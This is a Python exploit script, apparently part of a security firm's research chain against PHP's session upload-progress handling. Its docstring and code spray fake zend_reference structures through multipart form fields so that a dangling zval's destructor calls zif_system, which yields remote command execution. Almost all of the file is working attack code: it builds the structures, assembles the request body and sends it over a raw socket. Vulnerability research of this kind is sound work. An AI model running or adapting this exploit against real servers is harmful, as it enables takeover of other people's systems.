#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 GG ADVANCED IT Security UG

"""b2_exec.py - spray fake zend_references so the stale zval slot calls our destructor.

The request is a spray, not a payload: every 384-byte value carries the same 32-byte fake
`zend_reference` (refcount 1, type IS_REFERENCE, ptr = S) repeated every 32 bytes, and one `ht` field
carries the fake array built by mk_fake_ht.py. The field order and lengths are what make the spray
land on the two slots the cheap-OOM arming left dangling: one value's body has to cover the stale zval
slot (hsv), and the `ht` value has to start exactly at S.

When the session shuts down it dereferences the overwritten zval, sees a reference to an array, and
destroys that array - which calls `pDestructor`, i.e. `zif_system(cmd)`.

usage:
  b2_exec.py --url http://127.0.0.1:18110/index.php --ht-addr 0x7f... --ht-file ht.bin \\
             --vl 384 --n1 500 --n2 495
"""
import argparse
import socket
import struct

BOUNDARY = b"C" * 10


def fake_reference(ptr, refcount=1, value_type=0x0107):
    """A 32-byte zend_reference: what the session's dangling zval is turned into.

    The inner value is typed IS_ARRAY (0x07) with the high flags byte set, which is what makes the
    engine treat ptr as an array and call its destructor instead of just dropping it.
    """
    ref = bytearray(32)
    struct.pack_into("<I", ref, 0x00, refcount)
    ref[0x04] = 0x0A                      # IS_REFERENCE
    struct.pack_into("<Q", ref, 0x08, ptr)
    struct.pack_into("<I", ref, 0x10, value_type)
    ref[0x14] = 0x11                      # keep the byte the engine tests non-zero
    return bytes(ref)


def spray_value(length, ptr, refcount, value_type, first=8, step=32):
    value = bytearray(b"S" * length)
    offset = first
    while offset + 32 <= length:
        value[offset:offset + 32] = fake_reference(ptr, refcount, value_type)
        offset += step
    return bytes(value)


def field_name(prefix, index, length):
    base = prefix + ("%09d" % index).encode()
    return (base + b"x" * length)[:length]


def build(ht, ht_addr, n1, n2, value_len, sid, progress, refcount, name_len,
          boundary=BOUNDARY):
    spray = spray_value(value_len, ht_addr, refcount, 0x0107)
    out = bytearray()

    def part(name, value):
        out.extend(b"--" + boundary + b"\r\nContent-Disposition: form-data; name=\""
                   + name + b"\"\r\n\r\n" + value + b"\r\n")

    for i in range(n1):
        part(field_name(b"s", i, name_len), spray)
    part(b"ht", ht)
    part(b"PHPSESSID", sid)
    part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    for i in range(n2):
        part(field_name(b"t", i, name_len), spray)
    out.extend(b"--" + boundary + b"--\r\n")
    return bytes(out)


def send(host, port, path, body, timeout):
    request = ("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
               "Content-Type: multipart/form-data; boundary=%s\r\n"
               "Content-Length: %d\r\nConnection: close\r\n\r\n"
               % (path, host, port, BOUNDARY.decode(), len(body))).encode()
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
    except OSError as exc:
        return b"", "no target on %s:%d (%s)" % (host, port, exc.strerror or exc)
    response = bytearray()
    try:
        sock.settimeout(timeout)
        sock.sendall(request + body)
        while True:
            chunk = sock.recv(65536)
            if not chunk:
                break
            response.extend(chunk)
    except OSError:
        pass
    finally:
        sock.close()
    return bytes(response), None


def main():
    ap = argparse.ArgumentParser(description="fake-reference spray that triggers the destructor")
    ap.add_argument("--url", default="http://127.0.0.1:18110/index.php")
    ap.add_argument("--ht-addr", required=True, help="address of the fake array (S)")
    ap.add_argument("--ht-file", required=True, help="bytes built by mk_fake_ht.py")
    ap.add_argument("--vl", type=int, default=384)
    ap.add_argument("--n1", type=int, default=500)
    ap.add_argument("--n2", type=int, default=495)
    ap.add_argument("--name-len", type=int, default=10)
    ap.add_argument("--rc", type=int, default=1)
    ap.add_argument("--sid", default="a" * 32)
    ap.add_argument("--progress", default="k0")
    ap.add_argument("--timeout", type=float, default=120.0)
    args = ap.parse_args()

    with open(args.ht_file, "rb") as handle:
        ht = handle.read()
    ht_addr = int(args.ht_addr, 0)
    hostport = args.url.split("://", 1)[-1]
    hostport, _, path = hostport.partition("/")
    host, _, port = hostport.partition(":")
    body = build(ht, ht_addr, args.n1, args.n2, args.vl, args.sid.encode(),
                 args.progress.encode(), args.rc, args.name_len)
    response, error = send(host, int(port or 80), "/" + path, body, args.timeout)
    status = response.split(b"\r\n", 1)[0][:40].decode("latin1", "replace") if response else ""
    print("b2 vl=%d n1=%d n2=%d rc=%d S=%#x ht=%d body=%d response=%d %s%s"
          % (args.vl, args.n1, args.n2, args.rc, ht_addr, len(ht), len(body), len(response), status,
             "  [socket %s]" % error if error else ""))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
